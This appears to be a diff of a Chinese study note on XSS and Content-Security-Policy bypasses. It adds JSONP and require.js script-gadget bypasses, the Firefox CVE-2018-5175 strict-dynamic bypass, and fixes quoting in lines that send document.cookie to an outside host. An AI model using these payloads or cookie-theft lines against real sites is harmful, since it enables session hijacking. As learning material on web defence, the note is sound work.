@@ -105,9 +105,14 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
 以上CSP只能讓您加載當前domain下的js，尋找後台上傳內容為js的圖片或文件，`src=upload/1pwnch.js`
 ```php
 header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
+Content-Security-Policy: script-src 'self' trusted.domain.com
 ```
-以上CSP只能加載特定資料夾下的js，這時候可以尋找`static/`下有沒有可控的跳轉文件(302)，我們可以把這個文件當作跳板去加載我們上傳的js文件  
-實際上，CSP無法阻止的事情可多著，如果開發者的代碼直接截取使用者輸入作為js執行，CSP也會變得毫無意義，或者是用`jsonp`來進行跨域的請求  
+以上第一例中CSP只能加載特定資料夾下的js，這時候可以尋找`static/`下有沒有可控的跳轉文件(302)，我們可以把這個文件當作跳板去加載我們上傳的js文件  
+第二例中可以找trusted.domain.com中有沒有可以bypass的script，或者有沒有**jsonp**的利用點，如下：  
+```php
+<script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
+```
+除了jsonp，`Angularjs`也可被用來bypass，因此下面的`strict-dynamic`便顯得更加重要了  
 來看看最常見的CSP  
 ```php
 header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
@@ -127,8 +132,8 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
   2. 跳轉 && 跨域  
      跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
      ```js
-     <script>location.href=http://lorexxar.cn?a+document.cookie</script>
-     <script>windows.open(http://lorexxar.cn?a=+document.cooke)</script>
+     <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
+     <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
      <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
      // 
      var x = document.createElement("x");
@@ -151,17 +156,67 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
   諸如`location.hash`操作的xss攻擊，根本不需要經過後台，那nonce的值也不會刷新  
 * strict-dynamic  
   這是在CSP3中新規範的一種參數，為了現代各式各樣的框架而提出  
-  ```php
+  ```js
   script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
+  // 以下為masakato對strict-dynamic的解釋
+  // 可加載
+  <script src='test.com/a.js' nonce='random'></script>
   ```
   這樣一行CSP就可以確保所有**靜態**的`script`有匹配的nonce，strict-dynamic可以幫助開發人員在web運行過程中動態加載受信任的腳本  
-  **Script Gadgets**[security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
+  如果`a.js`想要加載其他的js，只有**非parser-inserted**的script可以被允許執行  
+  ```js
+  <!-- a.js -->
+  // 可加載
+  var script = document.createElement('script');
+  script.src = 'test.com/dependency.js';
+  document.body.appendChild(script);
+  // 不可
+  document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
+  ```
+  `createElement`時，element還屬於非parser-inserted屬性的，使用`documemt.write`的話就是parser-inserted屬性的了  
+    
+  **Script Gadgets**：  
+  [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
+  Script Gadget是指一些已存在的js code用來bypass xss mitigations  
+  ```js
+  // bypass with require.js
+  Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
+  <script data-main="data:,alert(1)"></script>
+  <script nonce="random" src="require.js"></script>
+  // 原因：require.js在找到帶有data-main屬性的script時，會如下載入
+  var node = document.createElement('script');
+  node.src = 'data:,alert(1)';
+  document.head.appendChild(node);
+  // 如上面提到的，非parser-inserted
+  ```
+
+  **CVE-2018-5175** (利用**add-on**繞過strict-dynamic)：  
+  [首先extension和add-on都是些什麼東西？](https://developer.mozilla.org/zh-TW/Add-ons/WebExtensions)  
+  legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
+  這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
+  ```json
+  ....
+  resource devtools devtools/modules/devtools/
+  resource devtools-client-jsonview resouce://devtools/client/jsonview/ contentaccessible=yes
+  ....
+  ```
+  上面是firefox extension下`manifest`的一部分，可以知道`resource://devtools`下面的file都可以從任何頁面載入而不需要nonce的允許，而`resource://devtools/client/jsonview/lib/require.js`也不例外。  
+  ```js
+  <!-- exploit -->
+  csp: strict-dynamic...
+
+  <script data-main="data:,alert(1)"></script>
+  <script src="resource://devtools-client-jsonview/lib/require.js"></script>
+  ```
+  所以我們不需要nonce也能讓`require.js`載入執行，靠script-gadget中提到`require.js`尋找`data-main`屬性，不難理解這個xss的攻擊就會成功bypass csp了！
 
 以web開發人員的角度推薦幾個工具：  
 1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
 2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  
 
-以上筆記很大部分取自[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
+以上筆記很大部分取自  
+[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
+[CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
 非常推薦閱讀原文  
 [迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)
 
@@ -269,4 +324,5 @@ atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧�
 6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
 7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
 8. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
-9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)
+9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
+10. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
